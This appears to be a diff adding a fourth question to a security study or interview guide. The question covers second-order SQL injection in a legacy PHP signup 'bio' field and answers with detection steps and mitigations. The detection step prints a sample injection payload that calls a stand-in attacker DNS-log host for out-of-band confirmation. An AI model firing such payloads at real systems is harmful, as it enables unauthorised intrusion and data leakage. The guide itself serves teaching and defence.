@@ -100,3 +100,30 @@ The backend is written in a dynamically typed language like Python or JavaScript
    const values = [req.body.userId];
    db.query(query, values);
    ```
+
+---
+
+### 🧩 Question 4:
+**Scenario:**  
+You're reviewing a legacy PHP application where the `bio` field submitted during user signup is stored in the database and later rendered in the admin dashboard. A security test revealed that this `bio` content is reused without revalidation or escaping, and it's also passed into SQL queries indirectly via a cron job.
+
+#### ❓ Questions:
+1. What type of injection is this?
+2. How would you detect and confirm this vulnerability?
+3. What mitigation strategies would you apply?
+
+✅ **Final Answer:**
+
+1. **Type of injection:**  
+   This is a **Second-Order SQL Injection**. The malicious input is stored in the database during an initial operation (e.g., signup) but the injection occurs later when that data is reused in a different context (e.g., cron job or admin view) without proper sanitization or escaping.
+
+2. **Detection and confirmation:**
+   - Insert a payload like `' ; SELECT load_extension('\\\\attacker.dnslog.domain\\abc');--` in the `bio` field during signup.
+   - Monitor for delayed SQL execution or out-of-band interactions when the admin dashboard or cron job processes the data.
+   - Tools like Burp Collaborator, DNS logs, or backend logs can help confirm this behavior.
+
+3. **Mitigation:**
+   - Always validate and sanitize inputs both on entry and before reuse.
+   - Apply parameterized queries during *every* database interaction, not just at insertion.
+   - Avoid dynamic query construction using previously stored user inputs.
+   - Use logging and alerting to detect suspicious behavior or unexpected outbound requests from internal systems.
